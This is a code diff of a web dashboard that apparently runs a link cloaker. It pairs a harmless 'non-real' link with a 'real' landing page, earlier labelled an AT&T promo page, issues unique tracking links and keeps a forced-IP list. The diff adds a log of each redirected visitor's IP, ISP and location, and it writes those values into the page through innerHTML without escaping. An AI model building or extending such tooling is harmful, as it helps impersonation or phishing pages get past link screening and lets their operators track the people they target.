@@ -82,8 +82,8 @@
                 <input type="text" id="nonRealLink" placeholder="https://safe-site.com">
             </div>
             <div class="form-group">
-                <label>Real Landing Page (AT&T Page)</label>
-                <input type="text" id="realLink" placeholder="https://att-promo.com">
+                <label>Real Landing Page (Your Page Link)</label>
+                <input type="text" id="realLink" placeholder="https://your-page-link.com">
             </div>
             <button onclick="saveSettings()">Save Links</button>
         </div>
@@ -162,6 +162,26 @@
             <div id="linkResult" style="margin-top: 15px; display: none;">
                 <strong>Unique Link:</strong>
                 <code id="trackingUrl" style="display: block; background: #eee; padding: 10px; margin-top: 5px; border-radius: 4px;"></code>
+            </div>
+        </div>
+
+        <div class="card">
+            <h2>Real Visits Log</h2>
+            <p>Recent visitors that were redirected to your Real Landing Page.</p>
+            <div class="table-container" style="width: 100%; overflow-x: auto;">
+                <table style="width: 100%; border-collapse: collapse; margin-top: 10px; min-width: 600px;">
+                    <thead>
+                        <tr style="background: #007bff; color: white;">
+                            <th style="padding: 10px; text-align: left; border: 1px solid #ddd;">Time</th>
+                            <th style="padding: 10px; text-align: left; border: 1px solid #ddd;">IP Address</th>
+                            <th style="padding: 10px; text-align: left; border: 1px solid #ddd;">ISP</th>
+                            <th style="padding: 10px; text-align: left; border: 1px solid #ddd;">Location</th>
+                        </tr>
+                    </thead>
+                    <tbody id="realVisitsTable">
+                        <!-- Real visits will be loaded here -->
+                    </tbody>
+                </table>
             </div>
         </div>
     </div>
@@ -246,6 +266,26 @@
                     li.innerHTML = `${ip} <span style="color:red; cursor:pointer;" onclick="removeForcedIp('${ip}')">[Remove]</span>`;
                     forcedIpList.appendChild(li);
                 });
+
+                // Render Real Visits
+                const realVisitsTable = document.getElementById('realVisitsTable');
+                realVisitsTable.innerHTML = '';
+                const realVisits = (user.visitedIps || []).filter(v => v.type === 'REAL').reverse();
+                
+                if (realVisits.length === 0) {
+                    realVisitsTable.innerHTML = '<tr><td colspan="4" style="text-align:center; padding:10px;">No real visits logged yet.</td></tr>';
+                } else {
+                    realVisits.forEach(v => {
+                        const tr = document.createElement('tr');
+                        tr.innerHTML = `
+                            <td style="padding: 10px; border: 1px solid #ddd;">${new Date(v.timestamp).toLocaleString()}</td>
+                            <td style="padding: 10px; border: 1px solid #ddd;">${v.ip}</td>
+                            <td style="padding: 10px; border: 1px solid #ddd;">${v.isp || 'N/A'}</td>
+                            <td style="padding: 10px; border: 1px solid #ddd;">${v.location || 'N/A'}</td>
+                        `;
+                        realVisitsTable.appendChild(tr);
+                    });
+                }
             } catch (err) {
                 console.error("Dashboard Load Error:", err);
             }
